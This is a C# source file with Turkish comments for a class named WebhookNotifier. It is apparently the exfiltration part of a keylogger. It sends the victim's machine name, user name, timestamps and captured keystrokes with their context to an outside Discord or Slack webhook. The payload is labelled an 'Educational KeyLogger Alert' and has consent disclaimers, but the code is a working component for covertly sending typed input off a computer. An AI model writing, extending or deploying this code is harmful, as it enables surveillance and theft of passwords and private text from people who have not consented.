using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Text.Json;

namespace GameOdev
{
    /// <summary>
    /// Webhook ile anlık bildirim gönderimi
    /// Eğitim amaçlı - izinli kullanım için
    /// </summary>
    public class WebhookNotifier
    {
        private string _webhookUrl;
        private HttpClient _httpClient;

        public WebhookNotifier(string webhookUrl)
        {
            _webhookUrl = webhookUrl;
            _httpClient = new HttpClient();
        }

        /// <summary>
        /// Discord/Slack webhook ile bildirim gönder
        /// </summary>
        public async Task SendNotificationAsync(string message, string computerName = null)
        {
            try
            {
                var payload = new
                {
                    content = $"🔍 **Educational KeyLogger Alert**\n" +
                             $"📱 **Computer:** {computerName ?? Environment.MachineName}\n" +
                             $"👤 **User:** {Environment.UserName}\n" +
                             $"🕒 **Time:** {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n" +
                             $"📝 **Message:** {message}\n\n" +
                             $"⚠️ *This is for educational purposes only with proper consent*"
                };

                string jsonPayload = JsonSerializer.Serialize(payload);
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                var response = await _httpClient.PostAsync(_webhookUrl, content);
                
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Webhook bildirimi başarıyla gönderildi.");
                }
                else
                {
                    Console.WriteLine($"Webhook hatası: {response.StatusCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Webhook gönderme hatası: {ex.Message}");
            }
        }

        /// <summary>
        /// Önemli tuş vuruşları için bildirim gönder
        /// </summary>
        public async Task SendKeystrokeAlertAsync(string keystroke, string context = "")
        {
            // Sadece önemli tuşlar için bildirim gönder
            if (IsImportantKeystroke(keystroke))
            {
                string message = $"⌨️ **Key Pressed:** {keystroke}\n" +
                               $"📄 **Context:** {context}\n" +
                               $"🕒 **Time:** {DateTime.Now:HH:mm:ss}";

                await SendNotificationAsync(message);
            }
        }

        private bool IsImportantKeystroke(string keystroke)
        {
            string[] importantKeys = { "[ENTER]", "[TAB]", "[ESC]", "[DELETE]", "[CTRL]", "[ALT]", "[WIN]" };
            
            foreach (string key in importantKeys)
            {
                if (keystroke.Contains(key))
                {
                    return true;
                }
            }
            
            return false;
        }

        public void Dispose()
        {
            _httpClient?.Dispose();
        }
    }
}
